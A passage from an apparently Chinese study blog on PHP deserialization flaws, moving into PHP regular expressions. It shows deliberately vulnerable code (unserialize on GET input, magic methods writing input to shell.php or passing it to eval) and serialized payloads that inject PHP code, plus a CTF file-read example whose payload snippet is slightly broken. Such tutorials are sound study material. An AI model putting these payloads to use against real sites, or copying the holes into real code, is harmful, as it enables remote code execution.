punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zhangsan</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$un</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$un</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-filesystem-fopen.html" target="_blank" rel="noopener">PHP fopen() 函数</a>：打开一个文件或 URL。</p><p><a href="https://www.runoob.com/php/func-filesystem-fwrite.html" target="_blank" rel="noopener">PHP fwrite() 函数</a>：将内容写入一个打开的文件中。</p><p><a href="https://www.runoob.com/php/func-filesystem-fclose.html" target="_blank" rel="noopener">PHP fclose() 函数</a>：闭打开的文件。</p><p>这里的意思就是将shell.php以写的形式打开，然后写入到name的值当中，又因为是__wakeup函数，所以会在反序列化之前被执行出来</p><p>源码分析（使用方法）：unserialize()反序列化之后会调用wakeup()函数，将对象属性name的值写入shell.php文件当中，然后去包含它。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span>O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="构造函数-construct"><a href="#构造函数-construct" class="headerlink" title="构造函数__construct()"></a>构造函数__construct()</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"construct被调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">person</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'zhangsan'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string">'boy'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$obj</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$zhangsan</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$zhangsan</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$un</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$un</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">"shell.php"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得：</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"zhangsan"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"boy"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改：</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"person"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string">"&lt;?php echo "</span><span class="token number">12346</span><span class="token string">";?>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也就是说只要调用那么函数__wakeup函数中的name就可以激活反序列化</p><p><a href="https://blog.csdn.net/qq_32393893/article/details/110290154?ops_request_misc=&request_id=&biz_id=102&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-110290154.first_rank_v2_pc_rank_v29" target="_blank" rel="noopener">待续</a></p><h3 id="魔术方法-toString"><a href="#魔术方法-toString" class="headerlink" title="魔术方法__toString()"></a>魔术方法__toString()</h3><p>当对象被输出的时候，会调用__toString()方法</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// 当他的对象被输出时候，调用__toString</span><span class="token keyword">class</span> <span class="token class-name">FileClass</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 返回读取一个文件的内容</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例化了一个对象$file，当我输出这个对象的时候，调用了__toString()方法，读取了文件flag.php的内容。</p><p>题目实操：</p><p>index.php：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>shield.php：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//flag is in pctf.php</span>    <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>              <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"pctf.php"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反序列化本地实验："><a href="#反序列化本地实验：" class="headerlink" title="反序列化本地实验："></a>反序列化本地实验：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">test</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'hacked by ghtwf01'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token string">'hacked by blckder02'</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__construct&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__destruct()&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__sleep&lt;br />'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'__wakeup&lt;br />'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//创建对象调用__construct</span>    <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//序列化对象调用__sleep</span>    <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//输出序列化后的字符串</span>    <span class="token keyword">echo</span> <span class="token string">'serialize: '</span><span class="token punctuation">.</span><span class="token variable">$serialize</span><span class="token punctuation">.</span><span class="token string">'&lt;br />'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//反序列化对象调用__wakeup</span>    <span class="token variable">$unserialize</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//调用pt输出数据</span>    <span class="token variable">$unserialize</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">pt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//脚本结束调用__destruct</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-php"><code class="language-php">__construct__sleepserialize<span class="token punctuation">:</span> O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"hacked by ghtwf01"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string">"hacked by blckder02"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>__wakeuphacked by ghtwf01<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="同名方法的利用"><a href="#同名方法的利用" class="headerlink" title="同名方法的利用"></a>同名方法的利用</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"action B"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"action A"</span><span class="token punctuation">;</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这里的classb和classc具有同名函数action，但是在classa中的构析函数中确实选择从classb中实例化对象，当脚本运行结束时，利用销毁函数调用classb中的action函数，由于classc中也含有action函数，并且有危代码执行漏洞，所以就可以将构析函数中的对象选择在classc中实例化对象</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token string">"phpinfo();"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">target</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"action C"</span><span class="token punctuation">;</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h2><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h2><h1 id="PHP之正则表达式"><a href="#PHP之正则表达式" class="headerlink" title="PHP之正则表达式"></a><a href="https://www.runoob.com/php/php-pcre.html" target="_blank" rel="noopener">PHP之正则表达式</a></h1><p><a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html" target="_blank" rel="noopener">w3cschool正则学习</a></p><h2 id="一、正则表达式的介绍："><a href="#一、正则表达式的介绍：" class="headerlink" title="一、正则表达式的介绍："></a>一、正则表达式的介绍：</h2><p>正则表达式是用于描述字符排列和匹配模式的一种语法规则。它主要用于字符串的模式分割、匹配、查找及替换操作。</p><ol><li>用途：匹配、查找、替换、分割</li><li>php提供了两套正则表达式函数库<pre><code>   1. Perl 兼容正则表达式函数（推荐使用）   2. POSIX 扩展正则表达式函数</code></pre></li></ol><h2 id="二、-语法："><a href="#二、-语法：" class="headerlink" title="二、 语法："></a>二、 语法：</h2><p>表达式的格式： “/表达式/[修正符]”<br>    解释：其中”/“表示正则表达式的定界符，但是也可以是其他符号：如”#“，”！“<br>        注意：定界符不可以是字母、数字和斜线\。<br>        像“#”、“|”、“!”等都可以的<br>        如：/…/  、#…# 、|….|<br>    其中修正符是可选的，表示对表达式做额外的修饰。</p><h2 id="三、-正则表达式的组成部分："><a href="#三、-正则表达式的组成部分：" class="headerlink" title="三、 正则表达式的组成部分："></a>三、 正则表达式的组成部分：</h2><h3 id="1-原子是组成正则表达式的基本单位-在分析正则表达式时，应作为一个整体。"><a href="#1-原子是组成正则表达式的基本单位-在分析正则表达式时，应作为一个整体。" class="headerlink" title="1.原子是组成正则表达式的基本单位,在分析正则表达式时，应作为一个整体。"></a>1.原子是组成正则表达式的基本单位,在分析正则表达式时，应作为一个整体。</h3><pre class="line-numbers language-php"><code class="language-php"> 原子包括以下内容<span class="token punctuation">:</span>        <span class="token operator">></span> 单个字符、数字，如a<span class="token operator">-</span>z，A<span class="token operator">-</span>Z，<span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span>。        <span class="token operator">></span> 模式单元，如（<span class="token constant">ABC</span>）可以理解为由多个原子组成的大的原子。        <span class="token operator">></span> 原子表，如 <span class="token punctuation">[</span><span class="token constant">ABC</span><span class="token punctuation">]</span>。        <span class="token 